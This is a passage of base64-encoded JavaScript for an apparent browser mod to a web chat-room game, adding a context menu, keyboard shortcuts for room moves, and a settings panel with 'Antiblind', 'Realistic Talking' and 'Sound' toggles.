ibm9uZSI7Cn0pOwoKLy9FbmQgb2YgREQgbWVudV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgovLyBBZGQgaGVhZGVyLCBidXR0b25zLCBhbmQgc2VwYXJhdG9yIHRvIGNvbnRleHQgbWVudQoKZnVuY3Rpb24gdXBkYXRlQ29udGV4dE1lbnUoKSB7CiAgd2hpbGUgKGNvbnRleHRNZW51LmZpcnN0Q2hpbGQpIHsKICAgIGNvbnRleHRNZW51LnJlbW92ZUNoaWxkKGNvbnRleHRNZW51LmZpcnN0Q2hpbGQpOwogIH0KICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChoZWFkZXIpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGNyZWF0ZVNlcGFyYXRvcigpKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24xKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24yKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24zKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b240KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b241KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b242KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b243KTsKICBpZiAodmlzYikgewogICAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uOCk7CiAgfSBlbHNlIHsKICAgIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjkpOwogIH0KICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24xMCk7CiAgLy8gQWRkIHRoZSBkcm9wZG93biBtZW51IHRvIHRoZSBjb250ZXh0IG1lbnUKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChjcmVhdGVTZXBhcmF0b3IoKSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoZHJvcGRvd25CdXR0b24pOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKHNlbGVjdCk7CiAgCn0KCnVwZGF0ZUNvbnRleHRNZW51KCk7CgovLyBFdmVudCBsaXN0ZW5lciB0byB1cGRhdGUgdGhlIG1lbnUgd2hlbiBvcGVuZWQKY29udGV4dE1lbnUuYWRkRXZlbnRMaXN0ZW5lcignY29udGV4dG1lbnUnLCBmdW5jdGlvbigpIHsKICB1cGRhdGVDb250ZXh0TWVudSgpOwp9KTsKCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGV4dE1lbnUpOwoKICAgIAp9KTsKCi8vIEZ1bmN0aW9uIHRvIGhpZGUgdGhlIGN1c3RvbSBjb250ZXh0IG1lbnUKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICAgIGlmIChjb250ZXh0TWVudU9wZW4pIHsKICAgICAgICB2YXIgY29udGV4dE1lbnUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCJkaXZbc3R5bGUqPSdmaXhlZCddIik7CiAgICAgICAgaWYgKGNvbnRleHRNZW51KSB7CiAgICAgICAgICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgICAgICAgRGlhbG9nTGVhdmUoKTsKICAgICAgICB9CiAgICAgICAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7CiAgICB9Cn0pOwoKCi8vU3RhcnQgb2Yga2V5Ym9hcmQgc2hvcnRjdXRzX19fX19fX19fX19fX19fX19fXwoKbGV0IGJhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwpsZXQgbGFzdEtleVByZXNzZWQgPSBudWxsOwoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgLy8gY2hlY2sgaWYgdGhlIGJhY2t0aWNrIChgKSBrZXkgaXMgcHJlc3NlZAogIGlmIChldmVudC5rZXkgPT09ICJgIiAmJiAhYmFja3RpY2tQcmVzc2VkKSB7CiAgICBiYWNrdGlja1ByZXNzZWQgPSB0cnVlOwogIH0KICAvLyBjaGVjayBpZiB0aGUgYmFja3RpY2sgKGApIGtleSBpcyBwcmVzc2VkIGFuZCBzdG9yZSB0aGUgbGFzdCBrZXkgcHJlc3NlZAogIGVsc2UgaWYgKGJhY2t0aWNrUHJlc3NlZCkgewogICAgbGFzdEtleVByZXNzZWQgPSBldmVudC5rZXk7CiAgfQp9KTsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleXVwIiwgZnVuY3Rpb24oZXZlbnQpIHsKICAvLyBjaGVjayBpZiB0aGUgYmFja3RpY2sgKGApIGtleSBpcyByZWxlYXNlZAogIGlmIChldmVudC5rZXkgPT09ICJgIikgewogICAgYmFja3RpY2tQcmVzc2VkID0gZmFsc2U7CiAgICBsYXN0S2V5UHJlc3NlZCA9IG51bGw7CiAgfQp9KTsKCi8vIGNoZWNrIGlmIHRoZSBsYXN0IGtleSBwcmVzc2VkIHdhcyAiLCIgb3IgIi4iIGFuZCBzZW5kIHRoZSBjb3JyZXNwb25kaW5nIGFjdGlvbgpzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICBpZiAobGFzdEtleVByZXNzZWQgPT09ICIsIiB8fCBsYXN0S2V5UHJlc3NlZCA9PT0gIi4iKSB7CiAgICBsZXQgYWN0aW9uID0gbGFzdEtleVByZXNzZWQgPT09ICIsIiA/ICJNb3ZlTGVmdCIgOiAiTW92ZVJpZ2h0IjsKICAgIFNlcnZlclNlbmQoIkNoYXRSb29tQWRtaW4iLCB7CiAgICAgIE1lbWJlck51bWJlcjogUGxheWVyLk1lbWJlck51bWJlciwKICAgICAgQWN0aW9uOiBhY3Rpb24sCiAgICB9KTsKICB9Cn0sIDUwKTsKLy9TdGFydCBvZiBQZXJzaXN0YW50IE1lbnUgX19fX19fX19fX19fX19fX19fX19fCgovLyBEZWZpbmUgdGhlIHNldHRpbmdzIG1lbnUgYW5kIGl0cyBvcHRpb25zCmNvbnN0IHNldHRpbmdzTWVudSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpzZXR0aW5nc01lbnUuaWQgPSAic2V0dGluZ3MtbWVudSI7CnNldHRpbmdzTWVudS5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CnNldHRpbmdzTWVudS5zdHlsZS50b3AgPSAiMjBweCI7CnNldHRpbmdzTWVudS5zdHlsZS5sZWZ0ID0gIjIwcHgiOwpzZXR0aW5nc01lbnUuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmZmYiOwpzZXR0aW5nc01lbnUuc3R5bGUuYm9yZGVyID0gIjFweCBzb2xpZCAjY2NjIjsKc2V0dGluZ3NNZW51LnN0eWxlLnBhZGRpbmcgPSAiM3B4IjsKc2V0dGluZ3NNZW51LnN0eWxlLmJvcmRlclJhZGl1cyA9ICIxMHB4IjsKc2V0dGluZ3NNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CnNldHRpbmdzTWVudS5zdHlsZS56SW5kZXggPSAiOTk5OSI7CgovL0JDTSBsb2dvICAgCmNvbnN0IGNvbXBhbnlMb2dvID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CmNvbXBhbnlMb2dvLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwpjb21wYW55TG9nby5zdHlsZS5mbG9hdCA9ICJsZWZ0IjsKY29tcGFueUxvZ28uc3R5bGUubWFyZ2luUmlnaHQgPSAiMTBweCI7CmNvbXBhbnlMb2dvLnN0eWxlLndpZHRoID0gIjQwcHgiOyAvLyBBZGp1c3QgbG9nbyBzaXplIGFzIG5lZWRlZApjb21wYW55TG9nby5zdHlsZS5oZWlnaHQgPSAiNDBweCI7IC8vIEFkanVzdCBsb2dvIHNpemUgYXMgbmVlZGVkCnNldHRpbmdzTWVudS5hcHBlbmRDaGlsZChjb21wYW55TG9nbyk7CgovL09wdGlvbnMgYW5kIHN0eWxlX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCmNvbnN0IG9wdGlvbjEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwpvcHRpb24xLnRleHRDb250ZW50ID0gIkFudGlibGluZCI7CmNvbnN0IGNoZWNrYm94MSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CmNoZWNrYm94MS50eXBlID0gImNoZWNrYm94IjsKY2hlY2tib3gxLmlkID0gIm9wdGlvbjEiOwpjaGVja2JveDEuc3R5bGUubWFyZ2luUmlnaHQgPSAiNXB4IjsKY2hlY2tib3gxLnN0eWxlLnZlcnRpY2FsQWxpZ24gPSAibWlkZGxlIjsKb3B0aW9uMS5hcHBlbmRDaGlsZChjaGVja2JveDEpOwpzZXR0aW5nc01lbnUuYXBwZW5kQ2hpbGQob3B0aW9uMSk7Cgpjb25zdCBvcHRpb24yID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGFiZWwiKTsKb3B0aW9uMi50ZXh0Q29udGVudCA9ICJSZWFsaXN0aWMgVGFsa2luZyI7CmNvbnN0IGNoZWNrYm94MiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CmNoZWNrYm94Mi50eXBlID0gImNoZWNrYm94IjsKY2hlY2tib3gyLmlkID0gIm9wdGlvbjIiOwpjaGVja2JveDIuc3R5bGUubWFyZ2luUmlnaHQgPSAiNXB4IjsKY2hlY2tib3gyLnN0eWxlLnZlcnRpY2FsQWxpZ24gPSAibWlkZGxlIjsKb3B0aW9uMi5hcHBlbmRDaGlsZChjaGVja2JveDIpOwpzZXR0aW5nc01lbnUuYXBwZW5kQ2hpbGQob3B0aW9uMik7Cgpjb25zdCBvcHRpb24zID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGFiZWwiKTsKb3B0aW9uMy50ZXh0Q29udGVudCA9ICJTb3VuZCI7CmNvbnN0IGNoZWNrYm94MyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CmNoZWNrYm94My50eXBlID0gImNoZWNrYm94IjsKY2hlY2tib3gzLmlkID0gIm9wdGlvbjMiOwpjaGVja2JveDMuc3R5bGUubWFyZ2luUmlnaHQgPSAiNXB4IjsKY2hlY2tib3gzLnN0eWxlLnZlcnRpY2FsQWxpZ24gPSAibWlkZGxlIjsKb3B0aW9uMy5hcHBlbmRDaGlsZChjaGVja2JveDMpOwpzZXR0aW5nc01lbnUuYXBwZW5kQ2hpbGQob3B0aW9uMyk7CgovLyBBZGQgc29tZSBiYXNpYyBzdHlsaW5nIHRvIHRoZSBsYWJlbHMKb3B0aW9uMS5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwpvcHRpb24xLnN0eWxlLmp1c3RpZnlDb250ZW50ID0gImNlbnRlciI7Cm9wdGlvbjEuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwpvcHRpb24xLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICIxMHB4IjsKb3B0aW9uMS5zdHlsZS5wYWRkaW5nID0gIjVweCI7Cm9wdGlvbjEuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7Cm9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwoKb3B0aW9uMi5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwpvcHRpb24yLnN0eWxlLmp1c3RpZnlDb250ZW50ID0gImNlbnRlciI7Cm9wdGlvbjIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwpvcHRpb24yLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICIxMHB4IjsKb3B0aW9uMi5zdHlsZS5wYWRkaW5nID0gIjVweCI7Cm9wdGlvbjIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7Cm9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwoKb3B0aW9uMy5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwpvcHRpb24zLnN0eWxlLmp1c3RpZnlDb250ZW50ID0gImNlbnRlciI7Cm9wdGlvbjMuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwpvcHRpb24zLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICIxMHB4IjsKb3B0aW9uMy5zdHlsZS5wYWRkaW5nID0gIjVweCI7Cm9wdGlvbjMuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7Cm9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwoKLy8gQWRkIHNvbWUgYmFzaWMgaG92ZXIgZWZmZWN0cyB0byB0aGUgbGFiZWxzCm9wdGlvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VlbnRlciIsIGZ1bmN0aW9uKCkgewogIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGQiOwogIG9wdGlvbjEuc3R5bGUuY3Vyc29yID0gInBvaW50ZXIiOwp9KTsKCm9wdGlvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VsZWF2ZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDEuY2hlY2tlZCkgewogICAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAibGlnaHRncmVlbiI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgpvcHRpb24yLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZW50ZXIiLCBmdW5jdGlvbigpIHsKICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkIjsKICBvcHRpb24yLnN0eWxlLmN1cnNvciA9ICJwb2ludGVyIjsKfSk7CgpvcHRpb24yLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlbGVhdmUiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImxpZ2h0Z3JlZW4iOwogIH0gZWxzZSB7CiAgICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKb3B0aW9uMy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWVudGVyIiwgZnVuY3Rpb24oKSB7CiAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZCI7CiAgb3B0aW9uMy5zdHlsZS5jdXJzb3IgPSAicG9pbnRlciI7Cn0pOwoKb3B0aW9uMy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWxlYXZlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJsaWdodGdyZWVuIjsKICB9IGVsc2UgewogICAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCi8vIENoZWNrIHRoZSBjaGVja2JveCBzdGF0ZSB3aGVuIHRoZSBwYWdlIGxvYWRzCmNoZWNrYm94MS5jaGVja2VkID8gb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCIgOiBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKY2hlY2tib3gyLmNoZWNrZWQgPyBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IiA6IG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwpjaGVja2JveDMuY2hlY2tlZCA/IG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiIDogb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CgoKLy8gQ2hhbmdlIHRoZSBsYWJlbCBiYWNrZ3JvdW5kIGNvbG9yIHdoZW4gdGhlIGNoZWNrYm94IGlzIGNoZWNrZWQKY2hlY2tib3gxLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDEuY2hlY2tlZCkgewogICAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgpjaGVja2JveDIuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94Mi5jaGVja2VkKSB7CiAgICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IjsKICB9IGVsc2UgewogICAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCmNoZWNrYm94My5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiOwogIH0gZWxzZSB7CiAgICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKLy9PcHRpb25zIEFjdGlvbnNfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKLy8gRGVmaW5lIHRoZSBmdW5jdGlvbiB0byBydW4gaW5zaWRlIHNldEludGVydmFsIGZvciBvcHRpb24gMQpmdW5jdGlvbiBydW5PcHRpb24xKCkgewogICAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICAgIGZ1bmN0aW9uIEdldEJsaW5kTGV2ZWwwKCkgewogICAgICAgIGxldCBibGluZExldmVsID0gMDsKICAgICAgICByZXR1cm4gYmxpbmRMZXZlbDsKICAgICAgfQogICAgICBQbGF5ZXIuR2V0QmxpbmRMZXZlbCA9IEdldEJsaW5kTGV2ZWwwOwogICAgICBQbGF5ZXIuR2V0QmxpbmRMZXZlbCgpOwogICAgfQogIH0KICAKICAvLyBEZWZpbmUgdGhlIGZ1bmN0aW9uIHRvIHJ1biBpbnNpZGUgc2V0SW50ZXJ2YWwgZm9yIG9wdGlvbiAyCiAgZnVuY3Rpb24gcnVuT3B0aW9uMigpIHsKICAgIGZ1bmN0aW9uIFJ1bkV4cHJlc3Npb25BbmltYXRpb25TdGVwKCkgewogICAgICBDaGFyYWN0ZXJTZXRGYWNpYWxFeHByZXNzaW9uKFBsYXllciwgIk1vdXRoIiwgZXhwcmVzc2lvbkFuaW1hdGlvbltleHByZXNzaW9uQW5pbWF0aW9uSW5kZXgrK10pOwogICAgICBpZiAoZXhwcmVzc2lvbkFuaW1hdGlvbkluZGV4IDwgZXhwcmVzc2lvbkFuaW1hdGlvbi5sZW5ndGgpIHsKICAgICAgICBzZXRUaW1lb3V0KFJ1bkV4cHJlc3Npb25BbmltYXRpb25TdGVwLCAxMDAwKTsKICAgICAgfSBlbHNlIHsKICAgICAgICBleHByZXNzaW9uQW5pbWF0aW9uID0gbnVsbDsKICAgICAgfQogICAgfQogIAogICAgZnVuY3Rpb24gUnVuRXhwcmVzc2lvbkFuaW1hdGlvbihsaXN0KSB7CiAgICAgIGlmIChleHByZXNzaW9uQW5pbWF0aW9uKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CiAgICAgIGV4cHJlc3Npb25BbmltYXRpb24gPSBsaXN0OwogICAgICBleHByZXNzaW9uQW5pbWF0aW9uSW5kZXggPSAwOwogICAgICBleHByZXNzaW9uQW5pbWF0aW9uRXggPSBJbnZlbnRvcnlHZXQoUGxheWVyLCAiTW91dGgiKTsKICAgICAgaWYgKGV4cHJlc3Npb25BbmltYXRpb25FeCAmJiBleHByZXNzaW9uQW5pbWF0aW9uRXguUHJvcGVydHkgJiYgZXhwcmVzc2lvbkFuaW1hdGlvbkV4LlByb3BlcnR5LkV4cHJlc3Npb24pIHsKICAgICAgICBleHByZXNzaW9uQW5pbWF0aW9uW2V4cHJlc3Npb25BbmltYXRpb24ubGVuZ3RoIC0gMV0gPSBleHByZXNzaW9uQW5pbWF0aW9uRXguUHJvcGVydHkuRXhwcmVzc2lvbjsgLy9zZXQgbGFzdCB0byBjdXJyZW50CiAgICAgIH0KICAgICAgUnVuRXhwcmVzc2lvbkFuaW1hdGlvblN0ZXAoKTsKICAgIH0KICAKICAgIGZ1bmN0aW9uIE5FV3RhbGtpbmcoKSB7CiAgICAgIHZhciBtc2cgPSBFbGVtZW50VmFsdWUoIklucHV0Q2hhdCIpLnRyaW0oKTsKICAgICAgaWYgKCFtc2cuc3RhcnRzV2l0aCgiLyIpICYmICFtc2cuc3RhcnRzV2l0aCgiKiIpICYmICFtc2cuc3RhcnRzV2l0aCgiISIpKSB7CiAgICAgICAgaWYgKG1zZy5sZW5ndGggPiAxMCkgewogICAgICAgICAgUnVuRXhwcmVzc2lvbkFuaW1hdGlvbihbbnVsbCwgIkdyaW4iLCAiU21pcmsiLCBudWxsLCAiR3JpbiIsICJTbWlyayIsIG51bGxdKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgUnVuRXhwcmVzc2lvbkFuaW1hdGlvbihbbnVsbCwgIkdyaW4iLCAiU21pcmsiLCBudWxsXSk7CiAgICAgICAgfQogICAgICB9CiAgICAgIE9MRHRhbGtpbmcoKTsKICAgIH0KICAKICAgIGlmIChjaGVja2JveDIuY2hlY2tlZCkgewogICAgICB2YXIgZXhwcmVzc2lvbkFuaW1hdGlvbjsKICAgICAgdmFyIGV4cHJlc3Npb25BbmltYXRpb25JbmRleCA9IDA7CiAgICAgIHZhciBPTER0YWxraW5nID0gQ2hhdFJvb21TZW5kQ2hhdDsKICAgICAgQ2hhdFJvb21TZW5kQ2hhdCA9IE5FV3RhbGtpbmc7CiAgICB9CiAgfQoKICBmdW5jdGlvbiBydW5PcHRpb24zKCkgewogICAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICAgIGZ1bmN0aW9uIHNob3dUb2FzdHNjcGcoKSB7CiAgICAgICAgQXVkaW9QbGF5SW5zdGFudFNvdW5kKCJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA5MDUzMDQ3OTA4MzYzMDY3Mi9oNDJ2d2NkLW5vdGlmaWNhdGlvbi0xX3ZNcWhWbHRTLm1wMyIsIDEpOwogICAgICAgIC8vIENyZWF0ZSB0aGUgdG9hc3QgY29udGFpbmVyCiAgICAgICAgdmFyIHRvYXN0Q29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvdHRvbSA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnJpZ2h0ID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5jb2xvciA9ICIjMTQxNDE0IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCAjNENBRjUwIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAiMnB4IDJweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC41KSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAiOTk5IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC41cyBlYXNlLWluLW91dCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKICAgICAgICB2YXIgc3RhdHVzQmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICBzdGF0dXNCYXIuc3R5bGUuaGVpZ2h0ID0gIjNweCI7CiAgICBzdGF0dXNCYXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CiAgICBzdGF0dXNCYXIuc3R5bGUuYm90dG9tID0gIjAiOwogICAgc3RhdHVzQmFyLnN0eWxlLmxlZnQgPSAiMCI7CiAgICBzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CiAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMCUiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoc3RhdHVzQmFyKTsKICAgIAogICAgCiAgICAvLyBVcGRhdGUgdGhlIHdpZHRoIG9mIHRoZSBzdGF0dXMgYmFyIGFzIGl0IGNvdW50cyBkb3duCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICB9LCAwKTsKICAgICAgICAKICAgIC8vIEFkZCB0aGUgY3VzdG9tIEJDTSBpY29uCiAgICB2YXIgaWNvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgaWNvbi5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKICAgIGljb24uc3R5bGUud2lkdGggPSAiMjNweCI7CiAgICBpY29uLnN0eWxlLmhlaWdodCA9ICIyM3B4IjsKICAgIGljb24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CiAgICBpY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKICAgIGljb24uc3R5bGUubWFyZ2luQm90dG9tID0gIi01cHgiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoaWNvbik7CiAgICAKICAgIC8vIEFkZCB0aGUgdGV4dCBtZXNzYWdlCiAgICB2YXIgdGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKICAgIHRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKICAgIHRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKICAgIHRleHQuaW5uZXJIVE1MID0gIkFjdGlvbiBTdWNjZXNzZnVsbHkgRXhlY3V0ZWQiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CiAgICAKICAgICAgICAKICAgICAgCiAgICAgICAgLy8gQXBwZW5kIHRoZSB0b2FzdCBjb250YWluZXIgdG8gdGhlIGJvZHkKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRvYXN0Q29udGFpbmVyKTsKICAgICAgCiAgICAgICAgLy8gU2hvdyB0aGUgdG9hc3Qgd2l0aCBhIGZhZGUgaW4gYW5pbWF0aW9uCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIxIjsKICAgICAgICB9LCAwKTsKICAgICAgCiAgICAgICAgLy8gSGlkZSB0aGUgdG9hc3Qgd2l0aCBhIGZhZGUgb3V0IGFuaW1hdGlvbgogICAgICAgIHNldFRpbWVvdXQ